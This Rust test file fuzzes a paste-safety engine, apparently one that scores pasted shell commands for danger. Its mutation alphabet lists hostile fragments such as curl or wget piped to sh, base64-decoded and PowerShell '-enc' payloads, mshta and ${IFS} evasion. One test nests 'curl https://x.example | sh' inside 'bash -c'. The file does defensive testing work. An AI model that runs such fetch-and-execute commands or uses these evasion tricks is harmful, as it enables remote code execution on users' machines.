//! "Fuzz smoke test" that runs everywhere without extra tooling: mutates the
//! corpus and random byte strings and checks the engine never panics and
//! stays within its size limits. (Deeper fuzzing: see fuzz/.)

use pasteproof_engine::{analyze, Options, MAX_INPUT};

struct Rng(u64);
impl Rng {
    fn next(&mut self) -> u64 {
        // xorshift64*
        self.0 ^= self.0 >> 12;
        self.0 ^= self.0 << 25;
        self.0 ^= self.0 >> 27;
        self.0.wrapping_mul(0x2545_F491_4F6C_DD1D)
    }
    fn below(&mut self, n: usize) -> usize {
        (self.next() % n.max(1) as u64) as usize
    }
}

const ALPHABET: &[&str] = &[
    "curl ",
    "wget ",
    "| ",
    "|",
    "sh",
    "bash",
    "$(",
    ")",
    "`",
    "<(",
    "'",
    "\"",
    "\\",
    "${IFS}",
    "$a",
    "a=cu;",
    "#",
    " ",
    "                                        ",
    "\n",
    ";",
    "&&",
    "&",
    ">",
    ">>",
    "<<<",
    "base64 -d",
    "echo ",
    "https://x.example/",
    "http://198.51.100.1/",
    "iex",
    "irm ",
    "powershell -enc ",
    "-w h",
    "mshta ",
    "\u{200B}",
    "\u{FF5C}",
    "é",
    "日本",
    "Y3VybA==",
    "aQBlAHgA",
    "(",
    "{",
    "}",
    "~/.bashrc",
    "crontab -",
    "python3 -c ",
    "-c ",
];

fn corpus_lines() -> Vec<String> {
    let dir = std::path::PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("../../corpus");
    ["malicious.tsv", "benign.tsv", "installers.tsv"]
        .iter()
        .flat_map(|f| {
            std::fs::read_to_string(dir.join(f))
                .unwrap_or_default()
                .lines()
                .map(String::from)
                .collect::<Vec<_>>()
        })
        .filter(|l| !l.starts_with('#'))
        .filter_map(|l| l.split_once('\t').map(|(_, c)| c.to_string()))
        .collect()
}

#[test]
fn never_panics_on_mutations() {
    let iterations: usize = std::env::var("PP_FUZZ_ITERS")
        .ok()
        .and_then(|v| v.parse().ok())
        .unwrap_or(20_000);
    let seeds = corpus_lines();
    let mut rng = Rng(0x9E37_79B9_7F4A_7C15);
    for _ in 0..iterations {
        let mut s = seeds[rng.below(seeds.len())].clone();
        for _ in 0..rng.below(6) {
            let piece = ALPHABET[rng.below(ALPHABET.len())];
            let mut at = rng.below(s.len() + 1);
            while !s.is_char_boundary(at) {
                at -= 1;
            }
            match rng.below(3) {
                0 => s.insert_str(at, piece),
                1 => s.truncate(at),
                _ => {
                    let mut end = (at + rng.below(8)).min(s.len());
                    while !s.is_char_boundary(end) {
                        end += 1;
                    }
                    s.replace_range(at..end, "");
                }
            }
        }
        let r = analyze(
            &s,
            &Options {
                pasted: rng.below(2) == 0,
                ..Default::default()
            },
        );
        assert!(r.score <= 100);
        assert!(r.hidden.len() <= 8);
    }
}

#[test]
fn never_panics_on_random_text() {
    let mut rng = Rng(42);
    for _ in 0..5_000 {
        let len = rng.below(300);
        let s: String = (0..len)
            .map(|_| char::from_u32((rng.next() % 0x3000) as u32).unwrap_or(' '))
            .collect();
        let _ = analyze(&s, &Options::default());
    }
}

#[test]
fn deep_nesting_is_bounded() {
    let mut s = String::from("curl https://x.example | sh");
    for _ in 0..200 {
        s = format!("bash -c \"$({s})\"");
    }
    let r = analyze(&s, &Options::default());
    assert!(r.score <= 100);
}

#[test]
fn oversized_input_is_truncated() {
    let s = "a".repeat(MAX_INPUT * 2);
    let r = analyze(&s, &Options::default());
    assert!(r.truncated);
}
